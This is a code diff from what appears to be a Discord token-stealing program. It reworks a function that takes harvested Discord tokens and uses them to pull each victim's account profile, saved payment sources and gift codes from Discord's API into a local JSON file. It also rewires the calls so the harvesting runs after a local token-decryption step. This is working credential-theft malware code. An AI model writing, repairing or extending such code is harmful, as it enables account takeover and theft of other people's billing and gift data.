@@ -72,52 +72,55 @@ const decryptRickRoll = (path) => {
   });
 };
 
-const handleTokens = (tokens, resolve) => tokens.forEach(token => {
-  axios.get('https://discord.com/api/v10/users/@me', {
-    headers: { Authorization: token, 'User-Agent': userAgent }
-  })
-    .then(res => {
-      let json = res.data;
-      json.token = token;
-      let info = JSON.parse(readFileSync(jsonFile).toString());
-      if (!info.accounts) info.accounts = [];
-      if (!info.accounts.find(account => account.token === token)) {
-        info.accounts.push(json);
-        writeFileSync(jsonFile, JSON.stringify(info));
-      }
-
-      axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
-        headers: { Authorization: token, 'User-Agent': userAgent }
-      })
-        .then(res => {
-          const json = res.data;
-          let info = JSON.parse(readFileSync(jsonFile).toString());
-          if (!info.billing) info.billing = [];
-          json.forEach(billing => {
-            if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
-          });
-          writeFileSync(jsonFile, JSON.stringify(info));
-
-          axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
-            headers: { Authorization: token, 'User-Agent': userAgent }
-          })
-            .then(res => {
-              const json = res.data;
-              let info = JSON.parse(readFileSync(jsonFile).toString());
-              if (!info.gifts) info.gifts = [];
-              json.forEach(gift => {
-                if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
-              });
-              writeFileSync(jsonFile, JSON.stringify(info));
-
-              resolve();
-            })
-            .catch(() => {});
-        })
-        .catch(() => {});
+const handleTokens = (tokens, resolve) => {
+  tokens.forEach(token => {
+    axios.get('https://discord.com/api/v10/users/@me', {
+      headers: { Authorization: token, 'User-Agent': userAgent }
     })
-    .catch(() => {});
-});
+      .then(res => {
+        let json = res.data;
+        json.token = token;
+        let info = JSON.parse(readFileSync(jsonFile).toString());
+        if (!info.accounts) info.accounts = [];
+        if (!info.accounts.find(account => account.token === token)) {
+          info.accounts.push(json);
+          writeFileSync(jsonFile, JSON.stringify(info));
+        }
+
+        axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
+          headers: { Authorization: token, 'User-Agent': userAgent }
+        })
+          .then(res => {
+            const json = res.data;
+            let info = JSON.parse(readFileSync(jsonFile).toString());
+            if (!info.billing) info.billing = [];
+            json.forEach(billing => {
+              if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
+            });
+            writeFileSync(jsonFile, JSON.stringify(info));
+
+            axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
+              headers: { Authorization: token, 'User-Agent': userAgent }
+            })
+              .then(res => {
+                const json = res.data;
+                let info = JSON.parse(readFileSync(jsonFile).toString());
+                if (!info.gifts) info.gifts = [];
+                json.forEach(gift => {
+                  if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
+                });
+                writeFileSync(jsonFile, JSON.stringify(info));
+
+                resolve();
+              })
+              .catch(() => {});
+          })
+          .catch(() => {});
+      })
+      .catch(() => {});
+  });
+  resolve();
+};
 
 module.exports = new Promise((resolve) => {
   Object.keys(paths).forEach(path => {
@@ -154,9 +157,11 @@ module.exports = new Promise((resolve) => {
           });
         });
       }
+      handleTokens(tokens, resolve);
     } else {
-      decryptRickRoll(paths[path]);
+      decryptRickRoll(paths[path]).then(() => {
+        handleTokens(tokens, resolve);
+      });
     }
-    handleTokens(tokens, resolve);
   });
 });
